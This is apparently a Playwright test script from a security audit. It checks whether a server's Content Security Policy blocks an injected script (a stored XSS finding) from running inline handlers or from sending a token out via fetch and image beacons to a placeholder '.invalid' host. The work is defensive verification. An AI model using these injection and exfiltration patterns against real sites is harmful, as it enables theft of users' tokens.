// Evidencia Fase 2 — qué alcanza a hacer un script inyectado (C-01) con la CSP que envía el servidor.
// Uso: BASE=http://127.0.0.1:3240 node 04_csp_navegador.js   (servidor de prueba levantado con srv.sh; Chromium de Playwright)
// No envía nada fuera: los destinos «externos» son dominios .invalid que no existen; lo que se mide es si la CSP los bloquea.
const { chromium } = require('playwright');
const BASE = process.env.BASE || 'http://127.0.0.1:3240';
(async () => {
  const browser = await chromium.launch();
  const page = await browser.newPage();
  await page.goto(BASE + '/', { waitUntil: 'domcontentloaded' });
  const r = await page.evaluate(async () => {
    const violaciones = [];
    document.addEventListener('securitypolicyviolation', e => violaciones.push(`${e.violatedDirective} → ${e.blockedURI}`));
    const out = {};
    // 1) manejador en línea como el del XSS almacenado C-01
    window.__f2 = 0;
    const d = document.createElement('div');
    d.innerHTML = '<img src="/no-existe-f2.png" onerror="window.__f2 = 1">';
    document.body.appendChild(d);
    // 2) fetch hacia un origen ajeno (exfiltración del token)
    try { await fetch('https://exfil.f2.invalid/t?x=1', { mode: 'no-cors' }); out.fetch = 'enviado'; } catch (e) { out.fetch = 'falló: ' + e.message; }
    // 3) baliza por imagen hacia un origen ajeno
    await new Promise(res => { const i = new Image(); i.onload = i.onerror = () => res(); i.src = 'https://exfil.f2.invalid/pixel.gif?t=1'; setTimeout(res, 3000); });
    // 4) mosaico permitido del mapa base (debe seguir permitido)
    await new Promise(res => { const i = new Image(); i.onload = i.onerror = () => res(); i.src = 'https://a.basemaps.cartocdn.com/light_all/1/0/0.png'; setTimeout(res, 3000); });
    await new Promise(res => setTimeout(res, 800));
    out.manejadorEnLinea = window.__f2 === 1 ? 'SE EJECUTÓ' : 'bloqueado';
    out.violaciones = violaciones;
    return out;
  });
  const h = await page.request.get(BASE + '/');
  console.log('CSP:', h.headers()['content-security-policy']);
  console.log('1) manejador en línea inyectado (onerror):', r.manejadorEnLinea);
  console.log('2) fetch a origen ajeno:', r.violaciones.some(v => v.startsWith('connect-src')) ? 'BLOQUEADO por connect-src' : `no bloqueado por la CSP (${r.fetch})`);
  console.log('3) baliza por imagen a origen ajeno:', r.violaciones.some(v => v.startsWith('img-src') && v.includes('exfil')) ? 'BLOQUEADA por img-src' : 'no bloqueada por la CSP');
  console.log('4) mosaico de CartoDB:', r.violaciones.some(v => v.includes('cartocdn')) ? 'BLOQUEADO (regresión)' : 'permitido por la CSP');
  console.log('violaciones registradas:', JSON.stringify(r.violaciones));
  await browser.close();
})().catch(e => { console.error(e); process.exit(1); });
